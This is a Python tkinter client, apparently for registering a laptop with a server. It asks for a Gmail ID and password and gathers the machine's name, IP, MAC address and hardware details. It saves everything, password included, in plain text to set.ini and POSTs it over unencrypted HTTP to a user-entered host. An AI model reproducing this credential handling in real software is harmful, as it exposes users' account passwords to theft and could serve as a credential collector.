import tkinter as tk 
from tkinter import messagebox
import requests
import os
import uuid
import socket
import psutil
import platform

try:
    from configparser import ConfigParser
except ImportError:
    from ConfigParser import ConfigParser  # For Python < 3.0

# Get the computer's name (PC Name)
pc_name = os.environ.get('COMPUTERNAME', 'Unknown')

# Function to get the IP address of the machine
def get_ip_address():
    try:
        hostname = socket.gethostname()
        ip_address = socket.gethostbyname(hostname)
        return ip_address
    except socket.error as e:
        print(f"Error retrieving IP address: {e}")
        return "Unknown"

# Function to get the MAC address of the machine
def get_mac_address():
    try:
        mac = ':'.join(['{:02x}'.format((uuid.getnode() >> (i * 8)) & 0xff) for i in range(6)][::-1])
        return mac
    except Exception as e:
        print(f"Error retrieving MAC address: {e}")
        return "Unknown"

# Function to get system information
def get_system_info():
    try:
        return {
            "system": platform.system(),
            "node_name": platform.node(),
            "release_version": platform.version(),
            "machine": platform.machine(),
            "processor": platform.processor(),
            "cpu_cores_physical": psutil.cpu_count(logical=False),
            "cpu_cores_logical": psutil.cpu_count(logical=True),
            "cpu_frequency": round(psutil.cpu_freq().current, 2) if psutil.cpu_freq() else 0,
            "total_memory": round(psutil.virtual_memory().total / (1024 ** 3), 2),
            "available_memory": round(psutil.virtual_memory().available / (1024 ** 3), 2),
            "used_memory": round(psutil.virtual_memory().used / (1024 ** 3), 2),
            "memory_usage": round(psutil.virtual_memory().percent, 2),
            "total_disk": round(psutil.disk_usage('/').total / (1024 ** 3), 2),
            "used_disk": round(psutil.disk_usage('/').used / (1024 ** 3), 2),
            "free_disk": round(psutil.disk_usage('/').free / (1024 ** 3), 2),
            "disk_usage": round(psutil.disk_usage('/').percent, 2)
        }
    except Exception:
        return {}

# Function to store credentials and send info
def set_credentials():
    global stored_gmail_id, stored_password
    gmail_id = gmail_id_entry.get().strip()
    password = password_entry.get().strip()
    sip_address_value = sip_address_entry.get().strip()

    if not gmail_id or not password:
        messagebox.showwarning("Input Error", "Please enter both Gmail ID and Password")
        return

    stored_gmail_id = gmail_id
    stored_password = password

    ip_address = get_ip_address()
    mac_address = get_mac_address()
    system_info = get_system_info()

    save_credentials_to_ini(stored_gmail_id, stored_password, ip_address, mac_address, sip_address_value, system_info)
    sendinfo(ip_address, mac_address, sip_address_value, system_info)

# Function to save data to ini file
def save_credentials_to_ini(gmail_id, password, ip_address, mac_address, sip_address, system_info, c_id=None, cl_id=None):
    config = ConfigParser()
    config.add_section('section_server')
    config.set('section_server', 'name', gmail_id)
    config.set('section_server', 'pass', password)
    config.set('section_server', 'ip_address', ip_address)
    config.set('section_server', 'mac_address', mac_address)
    config.set('section_server', 'sip_address', sip_address)
    config.set('section_server', 'pc_name', pc_name)

    for key, value in system_info.items():
        config.set('section_server', key, str(value))

    if c_id and cl_id:
        config.set('section_server', 'c_id', str(c_id))
        config.set('section_server', 'cl_id', str(cl_id))

    with open('set.ini', 'w') as configfile:
        config.write(configfile)

# Function to send info to server
def sendinfo(ip_address, mac_address, sip_address, system_info):
    try:
        sanitized_sip_address = sip_address.strip()

        data = {
            'fname': stored_gmail_id,
            'fpass': stored_password,
            'fpc_name': pc_name,
            'fip_address': ip_address,
            'fmac_address': mac_address,
            **system_info  # Merges system_info dictionary directly
        }

        response = requests.post(f'http://{sanitized_sip_address}/laptop2/post1.php', data=data)

        if response.status_code == 200:
            try:
                response_data = response.json()
                c_id = response_data.get('c_id')
                cl_id = response_data.get('cl_id')

                if c_id and cl_id:
                    save_credentials_to_ini(stored_gmail_id, stored_password, ip_address, mac_address, sanitized_sip_address, system_info, c_id, cl_id)
                    messagebox.showinfo("Registration Successful", f"Details saved successfully!\nc_id: {c_id}, cl_id: {cl_id}")
                else:
                    messagebox.showwarning("Server Error", "Failed to retrieve c_id and cl_id from the server.")
            except ValueError:
                messagebox.showwarning("Error", "Invalid server response format.")
        else:
            messagebox.showwarning("Error", f"Failed to communicate with server. Status Code: {response.status_code}")
    except requests.RequestException as e:
        messagebox.showwarning("Error", f"Error sending data: {e}")

# GUI Setup
root = tk.Tk()
root.title("Gmail Credentials")

tk.Label(root, text="SIP Address:").grid(row=0, column=0, padx=10, pady=10)
sip_address_entry = tk.Entry(root)
sip_address_entry.grid(row=0, column=1, padx=10, pady=10)

tk.Label(root, text="Gmail ID:").grid(row=1, column=0, padx=10, pady=10)
gmail_id_entry = tk.Entry(root)
gmail_id_entry.grid(row=1, column=1, padx=10, pady=10)

tk.Label(root, text="Password:").grid(row=2, column=0, padx=10, pady=10)
password_entry = tk.Entry(root, show="*")
password_entry.grid(row=2, column=1, padx=10, pady=10)

submit_button = tk.Button(root, text="Submit", command=set_credentials)
submit_button.grid(row=3, column=0, columnspan=2, pady=10)

# Run the GUI
if __name__ == "__main__":
    root.mainloop()
